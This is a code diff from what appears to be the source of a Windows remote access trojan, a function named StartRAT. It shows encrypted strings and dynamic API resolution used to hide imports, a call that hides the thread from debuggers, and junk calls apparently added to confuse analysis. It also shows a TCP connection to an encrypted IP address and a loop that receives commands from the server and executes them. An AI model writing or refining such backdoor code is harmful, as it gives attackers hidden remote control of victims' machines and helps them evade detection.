@@ -31,23 +31,25 @@ DWORD WINAPI StartRAT(LPVOID lpParam)
 	// define all strings with compile_time_encrypt()
 	// create wrappers that where needed, you just call it like this:  TCPClient* conn = new TCPClient(arrayToString(str_ip_encrypt), 54000);
 	// or in the resolve_dynamically: resolve_dynamically<GetCurrentThread_t>(arrayToCStr(str_GetCurrentThread_encrypt));
-	GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>(reencrypt_and_decrypt(str_GetCurrentThread, str_GetCurrentThread_len).c_str());
-	resolve_dynamically<NtSetInformationThread_t>(reencrypt_and_decrypt(str_NtSetInformationThread, str_NtSetInformationThread_len).c_str(), NTDLL_STR)(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);
+	GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>(string_decrypt(str_GetCurrentThread, str_GetCurrentThread_len).c_str());
+	resolve_dynamically<NtSetInformationThread_t>(string_decrypt(str_NtSetInformationThread, str_NtSetInformationThread_len).c_str(), NTDLL_STR)(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);
 
 	suspicious_junk_3();
 
-	TCPClient* conn = new TCPClient(reencrypt_and_decrypt(str_ip, str_ip_len), 54000);
+	TCPClient* conn = new TCPClient(string_decrypt(str_ip, str_ip_len), 54000);
 	conn->start_connection();
 
-	std::string commandLine = reencrypt_and_decrypt(str_cmd, str_cmd_len);
+	std::string commandLine = "";
 	while (true)
 	{
+		commandLine = string_decrypt(str_cmd, str_cmd_len);
+
 		suspicious_junk_1();
 
 		// recv command from server
 		commandLine.append(conn->recv_data());
 
-		std::string result = exec(commandLine);
+		std::string result = exec(commandLine);		
 
 		junk();
 
